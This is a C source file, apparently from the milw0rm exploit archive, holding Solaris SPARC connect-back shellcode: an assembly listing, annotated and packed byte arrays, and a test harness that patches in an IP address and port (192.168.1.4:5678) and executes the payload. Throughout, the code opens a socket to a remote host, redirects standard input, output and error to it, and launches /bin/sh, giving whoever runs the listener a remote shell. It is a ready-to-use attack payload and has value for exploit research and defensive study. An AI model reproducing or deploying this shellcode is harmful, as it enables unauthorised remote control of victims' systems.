/*
 * Solaris shellcode - connects /bin/sh to a host
 *
 * Claes M. Nyberg 20020624
 * <cmn@darklab.org>, <md0claes@mdstud.chalmers.se>
 */

#include <string.h>

/***********************************************************
void
main(void)
{

__asm__("

        ! Create socket
        mov    0x2, %o0         ! o0 = AF_INET
        mov    0x2, %o1         ! o1 = SOCK_STREAM
        xor    %o2, %o2, %o2    ! o2 = 0
        mov    0xe6, %g1        ! g1 = 230 = SYS_so_socket
        ta     8                ! socket(AF_INET, SOCK_STREAM, 0);
        add    %o0, 0x1, %l0    ! l0 = socket_fd +1

        ! Server address
        mov    0xc0, %l1        ! 192
        sll    %l1, 0x8, %l1    ! 192.0
        or     0xa8, %l1, %l1   ! 192.168
        sll    %l1, 0x8, %l1    ! 192.168.0
        or     0x1, %l1, %l1    ! 192.168.1
        sll    %l1, 0x8, %l1    ! 192.168.1.0
        or     0x1, %l1, %l1    ! 192.168.1.1
        st     %l1, [%sp - 12]  ! Server IP
        mov    0x2, %l1         ! AF_INET
        sth    %l1, [%sp -16]   ! Server family
        mov    0x30, %l1        ! High order byte of Port
        sll    %l1, 0x8, %l1    ! <<
        or     0x39, %l1, %l1   ! Low order byte of port
        sth    %l1, [%sp - 14]  ! Server port

        ! Connect
        sub    %sp, 16, %o1     ! o1 = &server
        mov    0x10, %o2        ! o2 = 16 = sizeof(struct sockaddr_in)
        mov    0xeb, %g1        ! g1 = 235 = SYS_connect
        ta     8                ! connect(socket_fd, &server, 16);

        ! Set up IO
        sub    %l0, 0x1, %o0    ! o0 = socket_fd
        mov    0x9, %o1         ! o1 = F_DUP2FD
        xor    %o2, %o2, %o2    ! o2 = 0 = STDIN_FILENO
        mov    0x3e, %g1        ! g1 = 62 = SYS_fcntl
        ta     8                ! fcntl(socket_fd, F_DUP2FD, STDIN_FILENO);
        sub    %l0, 0x1, %o0    ! o0 = socket_fd
        mov    0x1, %o2         ! o2 = 1 = STDOUT_FILENO
        ta     8                ! fcntl(socket_fd, F_DUP2FD, STDOUT_FILENO);
        sub    %l0, 0x1, %o0    ! o0 = socket_fd
        mov    0x2, %o2         ! o2 = 1 = STDERR_FILENO
        ta     8                ! fcntl(socket_fd, F_DUP2FD, STDERR_FILENO);

        ! Execve /bin/sh
        xor    %o2, %o2, %o2    ! o2 = 0 => envp = NULL
        set    0x2f62696e, %l0  ! lo = '/bin'
        set    0x2f2f7368, %l1  ! l1 = '//sh'
        st     %o2, [%sp - 4]   ! String ends with NULL
        st     %l1, [%sp - 8]   ! Write //sh to stack
        st     %l0, [%sp - 12]  ! Write /bin to stack
        sub    %sp, 12, %o0     ! o0 = &string
        st     %o2, [%sp - 16]  ! argv[1] = NULL
        st     %o0, [%sp - 20]  ! argv[0] = &string
        sub    %sp, 20, %o1     ! o1 = &string
        mov    0x3b, %g1        ! g1 = 59 = SYS_execve
        ta     8                ! execve(argv[0], argv, NULL);

        ! Exit
        mov    1, %g1           ! g1 = 1 = SYS_exit
        ta     8                ! exit();
    ");
}
***********************************************************/

/* Index of low order byte in IP address */
#define IP0       51
#define IP1       43
#define IP2       35
#define IP3       27

/* Index of low order byte in port */
#define P0        75
#define P1        67

static char solaris_code[] =

    /* Create socket */
    "\x90\x10\x20\x02"   /* mov     2, %o0               */
    "\x92\x10\x20\x02"   /* mov     2, %o1               */
    "\x94\x1a\x80\x0a"   /* xor     %o2, %o2, %o2        */
    "\x82\x10\x20\xe6"   /* mov     230, %g1             */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */
    "\xa0\x02\x20\x01"   /* add     %o0, 1, %l0          */

    /* Server address */
    "\xa2\x10\x20\xc0"   /* mov     192, %l1             */
    "\xa3\x2c\x60\x08"   /* sll     %l1, 8, %l1          */
    "\xa2\x14\x60\xa8"   /* or      %l1, 168, %l1        */
    "\xa3\x2c\x60\x08"   /* sll     %l1, 8, %l1          */
    "\xa2\x14\x60\x01"   /* or      %l1, 1, %l1          */
    "\xa3\x2c\x60\x08"   /* sll     %l1, 8, %l1          */
    "\xa2\x14\x60\x01"   /* or      %l1, 1, %l1          */
    "\xe2\x23\xbf\xf4"   /* st      %l1, [%sp - 12]      */
    "\xa2\x10\x20\x02"   /* mov     2, %l1               */
    "\xe2\x33\xbf\xf0"   /* sth     %l1, [%sp - 16]      */
    "\xa2\x10\x20\x30"   /* mov     48, %l1              */
    "\xa3\x2c\x60\x08"   /* sll     %l1, 8, %l1          */
    "\xa2\x14\x60\x39"   /* or      %l1, 57, %l1         */
    "\xe2\x33\xbf\xf2"   /* sth     %l1, [%sp - 14]      */

    /* Connect */
    "\x92\x23\xa0\x10"   /* sub     %sp, 16, %o1         */
    "\x94\x10\x20\x10"   /* mov     16, %o2              */
    "\x82\x10\x20\xeb"   /* mov     235, %g1             */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */

    /* Set up IO */
    "\x90\x24\x20\x01"   /* sub     %l0, 1, %o0          */
    "\x92\x10\x20\x09"   /* mov     9, %o1               */
    "\x94\x1a\x80\x0a"   /* xor     %o2, %o2, %o2        */
    "\x82\x10\x20\x3e"   /* mov     62, %g1              */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */
    "\x90\x24\x20\x01"   /* sub     %l0, 1, %o0          */
    "\x94\x10\x20\x01"   /* mov     1, %o2               */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */
    "\x90\x24\x20\x01"   /* sub     %l0, 1, %o0          */
    "\x94\x10\x20\x02"   /* mov     2, %o2               */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */

    /* Execve /bin/sh */
    "\x94\x1a\x80\x0a"   /* xor     %o2, %o2, %o2        */
    "\x21\x0b\xd8\x9a"   /* sethi   %hi(0x2f626800), %l0 */
    "\xa0\x14\x21\x6e"   /* or      %l0, 0x16e, %l0      */
    "\x23\x0b\xcb\xdc"   /* sethi   %hi(0x2f2f7000), %l1 */
    "\xa2\x14\x63\x68"   /* or      %l1, 0x368, %l1      */
    "\xd4\x23\xbf\xfc"   /* st      %o2, [%sp - 4]       */
    "\xe2\x23\xbf\xf8"   /* st      %l1, [%sp - 8]       */
    "\xe0\x23\xbf\xf4"   /* st      %l0, [%sp - 12]      */
    "\x90\x23\xa0\x0c"   /* sub     %sp, 12, %o0         */
    "\xd4\x23\xbf\xf0"   /* st      %o2, [%sp - 16]      */
    "\xd0\x23\xbf\xec"   /* st      %o0, [%sp - 20]      */
    "\x92\x23\xa0\x14"   /* sub     %sp, 20, %o1         */
    "\x82\x10\x20\x3b"   /* mov     59, %g1              */
    "\x91\xd0\x20\x08"   /* ta      0x8                  */

    /* Exit */
    "\x82\x10\x20\x01"   /* mov     1, %g1               */
    "\x91\xd0\x20\x08";  /* ta      0x8                  */


static char _solaris_code[] =
    "\x90\x10\x20\x02\x92\x10\x20\x02\x94\x1a\x80\x0a\x82\x10\x20\xe6"
    "\x91\xd0\x20\x08\xa0\x02\x20\x01\xa2\x10\x20\xc0\xa3\x2c\x60\x08"
    "\xa2\x14\x60\xa8\xa3\x2c\x60\x08\xa2\x14\x60\x01\xa3\x2c\x60\x08"
    "\xa2\x14\x60\x01\xe2\x23\xbf\xf4\xa2\x10\x20\x02\xe2\x33\xbf\xf0"
    "\xa2\x10\x20\x30\xa3\x2c\x60\x08\xa2\x14\x60\x39\xe2\x33\xbf\xf2"
    "\x92\x23\xa0\x10\x94\x10\x20\x10\x82\x10\x20\xeb\x91\xd0\x20\x08"
    "\x90\x24\x20\x01\x92\x10\x20\x09\x94\x1a\x80\x0a\x82\x10\x20\x3e"
    "\x91\xd0\x20\x08\x90\x24\x20\x01\x94\x10\x20\x01\x91\xd0\x20\x08"
    "\x90\x24\x20\x01\x94\x10\x20\x02\x91\xd0\x20\x08\x94\x1a\x80\x0a"
    "\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc\xa2\x14\x63\x68"
    "\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8\xe0\x23\xbf\xf4\x90\x23\xa0\x0c"
    "\xd4\x23\xbf\xf0\xd0\x23\xbf\xec\x92\x23\xa0\x14\x82\x10\x20\x3b"
    "\x91\xd0\x20\x08\x82\x10\x20\x01\x91\xd0\x20\x08";

int
main(void)
{
    void (*code)() = (void *)_solaris_code;

    _solaris_code[IP0] = 4;
    _solaris_code[IP1] = 1;
    _solaris_code[IP2] = 168;
    _solaris_code[IP3] = 192;

    _solaris_code[P0] = 0x2e;
    _solaris_code[P1] = 0x16;

    printf("Shellcode length: %d\n", strlen(_solaris_code));

	/* Connect to 192.168.1.4:5678 */
    code();
    return(1);
}

// milw0rm.com [2004-09-26]